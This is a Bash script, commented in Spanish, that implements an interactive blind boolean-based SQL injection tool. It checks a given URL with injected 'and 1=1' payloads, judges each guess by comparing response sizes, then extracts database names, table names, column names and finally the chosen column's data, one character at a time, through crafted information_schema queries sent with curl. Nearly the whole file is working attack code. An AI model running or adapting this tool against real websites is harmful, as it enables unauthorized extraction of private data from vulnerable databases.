#!/bin/bash

urlSize="$(curl -s $1 | wc --bytes)"
# ----------------------VARIABLES-----------------------
length=0
pageOnFail=""
eq=")="
a=""
x=""
menu=true
menuStart=true
vulnerable=false
infoColected=false
query=0
mode=0
url_dbName=""
url_dbNumber=""
url_dbSize=""
url_select=""
type=0
finalUrl=""
aux=""
maxElements=""
dbNumber=""
dbSize=""
charTest=""
pos=1
usingDb=""
usingTb=""
usingCol=""
data_table=""
data_col=""
str=""
dbMenu=""
tbMenu=""
colMenu=""
auxArr=()

declare -a countChar=()
declare -a types=("%20and%201=1" "%27%20and%20%271%27=%271" "%22%20and%20%221%22=%221")
declare -a substring=("%20" "%27%20" "%22%20")
declare -a finalDBSname=()

declare -a databases=()
declare -a query_db=("and%20(select%20count(schema_name)%20from%20information_schema.schemata)="
    "and%20(select%20length(schema_name)%20from%20information_schema.schemata%20limit%20#1,1)="
"and%20substring((select%20schema_name%20from%20information_schema.schemata%20limit%20#1,1),#2,1)=")

declare -a tables=()
declare -a query_table=("and%20(select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=#1)="
    "and%20(select%20length(table_name)%20from%20information_schema.tables%20where%20table_schema=#3%20limit%20#1,1)="
"and%20substring((select%20table_name%20from%20information_schema.tables%20where%20table_schema=#3%20limit%20#1,1),#2,1)=")

declare -a columns=()
declare -a query_column=("and%20(select%20count(column_name)%20from%20information_schema.columns%20where%20table_name=#1)="
    "and%20(select%20length(column_name)%20from%20information_schema.columns%20where%20table_name=#3%20limit%20#1,1)="
"and%20substring((select%20column_name%20from%20information_schema.columns%20where%20table_name=#3%20limit%20#1,1),#2,1)=")

declare -a data=()
# ============================================================================================================================

# funcion de menu principal
mainMenu(){
    while $menuStart; do
        printf "\n-Select option:\n1. Start\n2. Exit\n"
        read menuOp
        case $menuOp in
            1) tput -x clear ;
            selectDb ;;
            2) exit ;;
            *) echo "Not valid option" ;;
        esac
    done
}

vulnWarning(){
    echo "Page is vulnerable to Blind-base SQL injection. Do you want to proceed? [y/n]"
    while $menu; do
        read opt
        case $opt in
            y) menu=false ;
            mainMenu ;;
            n) exit ;;
            *) echo "Unknown response, type 'y' for yes or 'n' for no" ;;
        esac
    done
}

# funcion para elegir entre las bases de datos que hay
selectDb(){
    dbMenu=""
    databases=()
    tables=()
    columns=()
    
    echo "Getting database name..."
    url_number="$finalUrl""${query_db[0]}"
    getNumber $url_number
    
    url_size="$finalUrl""${query_db[1]}"
    getSize $url_size
    
    url_chars="$finalUrl""${query_db[2]}"
    n="${#countChar[@]}"
    for (( i=0; i<$n; i++ ))
    do
        getCharacters $i ${countChar[i]} $url_chars
    done
    
    while [[ "$dbMenu" != 'b' ]]; do
        tput -x clear
        echo ===============================SELECT DATABASE=====================================
        printf "\nSelect database to dump:\n"
        for (( i=0; i<"${#databases[@]}"; i++ ))
        do
            echo "  $i.""${databases[i]}"
        done
        echo "  b.""Go back"
        read dbMenu
        
        while [[ $dbMenu -ge ${#databases[@]} || $dbMenu -lt 0 ]]; do
            echo "not an option"
            read dbMenu
        done
        if [[ $dbMenu == 'b' ]]; then
            return 0
        fi
        # en este punto es opcion valida
        usingDb="${databases[dbMenu]}"
        charToAscii $usingDb
        usingDb="char(""$str"")"
        selectTb
    done
}

# funcion para elegir entre las tablas de datos que hay
selectTb(){
    tables=()
    tbMenu=""
    echo "Getting table name..."
    url_number="$finalUrl""${query_table[0]}"
    getNumber $url_number $usingDb
    
    url_size="$finalUrl""${query_table[1]}"
    getSize $url_size a $usingDb
    
    url_chars="$finalUrl""${query_table[2]}"
    n="${#countChar[@]}"
    for (( i=0; i<$n; i++ ))
    do
        getCharacters $i ${countChar[i]} $url_chars $usingDb
    done
    
    while [[ "$tbMenu" != 'b' ]]; do
        tput -x clear
        echo ===============================SELECT TABLE=====================================
        printf "\nSelect table:\n"
        for (( i=0; i<"${#tables[@]}"; i++ ))
        do
            echo "  $i.""${tables[i]}"
        done
        
        echo "  b.""Go back"
        read tbMenu
        
        while [[ $tbMenu -ge ${#tables[@]} || $tbMenu -lt 0 ]]; do
            echo "not an option"
            read tbMenu
        done
        if [[ $tbMenu == 'b' ]]; then
            return 0
        fi
        usingTb="${tables[tbMenu]}"
        data_table="$usingTb"
        charToAscii $usingTb
        usingTb="char(""$str"")"
        selectCol
    done
}

# funcion para elegir entre las columnas que hay
selectCol(){
    tput -x clear
    columns=()
    colMenu=""
    echo "Getting column name..."
    url_number="$finalUrl""${query_column[0]}"
    getNumber $url_number $usingTb
    
    url_size="$finalUrl""${query_column[1]}"
    getSize $url_size a $usingTb
    
    url_chars="$finalUrl""${query_column[2]}"
    n="${#countChar[@]}"
    for (( i=0; i<$n; i++ ))
    do
        getCharacters $i ${countChar[i]} $url_chars $usingTb
    done
    
    while [[ "$colMenu" != 'b' ]]; do
        echo ===============================SELECT COLUMN=====================================
        
        printf "\nSelect column:\n"
        for (( i=0; i<"${#columns[@]}"; i++ ))
        do
            echo "  $i.""${columns[i]}"
        done
        
        echo "  b.""Go back"
        read colMenu
        # comprueba si es opcion valida
        while [[ $colMenu -ge ${#columns[@]} || $colMenu -lt 0 ]]; do
            echo "not an option"
            read colMenu
        done
        if [[ $colMenu == 'b' ]]; then
            return 0
        fi
        usingCol="${columns[colMenu]}"
        data_col="$usingCol"
        charToAscii $usingCol
        usingCol="char(""$str"")"
        colMenu=""
        getData
    done
}

# cambia de char a valor decimal
charToAscii(){
    str=""
    arg=$1
    for (( i=0; i<"${#arg}"; i++ ))
    do
        if [[ ${#arg} == $(( i+1 )) ]]; then
            a=$(echo "${arg:$i:1}")
            str="$str""$(printf "%d\n" \'$a)"
        else
            a=$(echo "${arg:$i:1}")
            str="$str""$(printf "%d\n" \'$a)"","
        fi
    done
}

# saca la informacion una vez elegida la tabla y columna
getData(){
    data=()
    declare -a query_data=("and%20(select%20count($data_col)%20from%20$data_table)="
        "and%20(select%20length($data_col)%20from%20$data_table%20limit%20#1,1)="
    "and%201=1%20and%20substring((select%20$data_col%20from%20$data_table%20limit%20#1,1),#2,1)=")
    
    echo "Getting data..."
    url_number="$finalUrl""${query_data[0]}"
    getNumber $url_number
    
    url_size="$finalUrl""${query_data[1]}"
    getSize $url_size
    
    url_chars="$finalUrl""${query_data[2]}"
    n="${#countChar[@]}"
    for (( i=0; i<$n; i++ ))
    do
        getCharacters $i ${countChar[i]} $url_chars
    done
    
    echo ===============================INFO=====================================
    printf "Data found:\n"
    for (( i=0; i<"${#data[@]}"; i++ ))
    do
        echo "${data[i]}"
    done
}

# saca los caracteres del elemento
getCharacters(){
    aux=""
    wordLength=$2
    index=$1
    db=$4
    
    for (( k=1; k<=$wordLength; k++ ))
    do
        url_name="$3"
        
        if [[ "$url_name" =~ .*"%27%20".* || "$url_name" =~ .*"%22%20".* ]]; then
            url_name="$url_name""--%20-"
        fi
        
        if [[ "$url_name" =~ .*"#1".* ]]; then
            url_name="$(echo "$url_name" | sed "s/#1/$index/")"
        fi
        if [[ "$url_name" =~ .*"#2".* ]]; then
            url_name="$(echo "$url_name" | sed "s/#2/$k/")"
        fi
        if [[ "$url_name" =~ .*"#3".* ]]; then
            url_name="$(echo "$url_name" | sed "s/#3/$db/")"
        fi
        
        for (( j=122; j>=48; j-- ))
        do
            a=")=char($j)"
            charTest="$(echo "$url_name" | sed "s/$eq/$a/")"
            x="$(curl -s $charTest | wc --bytes)"
            
            if [[ $x -gt $pageOnFail ]]; then
                aux="$aux""$(printf "\x$(printf %x $j)\n")"
                break
            fi
        done
        if [[ $wordLength == $k ]]; then
            auxArr=()
            auxArr+=("$aux")
        fi
    done
    
    if [[ "$url_name" =~ .*".schemata".* ]]; then
        databases+=("${auxArr[@]}")
        echo "Database added: ${auxArr[@]}"
    fi
    if [[ "$url_name" =~ .*".tables".* ]]; then
        tables+=("${auxArr[@]}")
        echo "Table added: ${auxArr[@]}"
    fi
    if [[ "$url_name" =~ .*".columns".* ]]; then
        columns+=("${auxArr[@]}")
        echo "Column added: ${auxArr[@]}"
    fi
    if [[ "$url_name" =~ .*"1=1".* ]]; then
        data+=("${auxArr[@]}")
        echo "Data added: ${auxArr[@]}"
    fi
}

# saca cuantos caracteres tiene cada elemento
getSize(){
    countChar=()
    
    for (( j=0; j<$maxElements; j++ ))
    do
        url_dbSize="$1"
        arg2=$2
        arg3=$3
        
        if [[ "$url_dbSize" =~ .*"%27%20".* || "$url_dbSize" =~ .*"%22%20".* ]]; then
            url_dbSize="$url_dbSize""--%20-"
        fi
        
        if [[ "$url_dbSize" =~ .*"#1".* ]]; then
            url_dbSize="$(echo "$url_dbSize" | sed "s/#1/$j/")"
        fi
        if [[ "$url_dbSize" =~ .*"#2".* ]]; then
            url_dbSize="$(echo "$url_dbSize" | sed "s/#2/$arg2/")"
        fi
        if [[ "$url_dbSize" =~ .*"#3".* ]]; then
            url_dbSize="$(echo "$url_dbSize" | sed "s/#3/$arg3/")"
        fi
        
        for (( i=1; i<=40; i++ ))
        do
            a=")=$i"
            dbSize="$(echo "$url_dbSize" | sed "s/$eq/$a/")"
            x="$(curl -s $dbSize | wc --bytes)"
            
            if [[ $x -gt $pageOnFail ]]; then
                length="$i"
                countChar[j]="$i"
                echo "Item $j have ${countChar[j]} characters"
                break
            fi
            pageOnFail="$x"
        done
    done
}

# saca cuantos elementos hay
getNumber(){
    maxElements=0
    url_dbNumber="$1"
    arg2="$2"
    
    if [[ "$url_dbNumber" =~ .*"%27%20".* || "$url_dbNumber" =~ .*"%22%20".* ]]; then
        url_dbNumber="$url_dbNumber""--%20-"
    fi
    if [[ "$url_dbNumber" =~ .*"#1".* ]]; then
        url_dbNumber="$(echo "$url_dbNumber" | sed "s/#1/$arg2/")"
    fi
    
    for (( i=1; i<=30; i++ ))
    do
        a=")=$i"
        number="$(echo "$url_dbNumber" | sed "s/$eq/$a/")"
        x="$(curl -s $number | wc --bytes)"
        
        if [[ $x -gt $pageOnFail ]]; then
            maxElements="$i"
            echo "Number: $i"
        fi
        pageOnFail="$x"
    done
}

echo "Checking if given url is vulnerable..."
echo "--------------------------------------------------------------------------------------------------"
sleep 1

for (( i=0; i<3; i++ ))
do
    url="$1""${types[i]}"
    x="$(curl -s $url | wc --bytes)"
    
    if [[ $x -eq $urlSize ]];
    then
        finalUrl="$1""${substring[i]}"
        type=$(( i+1 ))
        echo $type
        echo "Vulnerable with ${types[i]}"
        echo "Testing URL -> $1"
        vulnerable=true;
    fi
    pageOnFail="$x"
done

if $vulnerable;then
    vulnWarning
else
    echo "Not vulnerable"
    exit
fi

mainMenu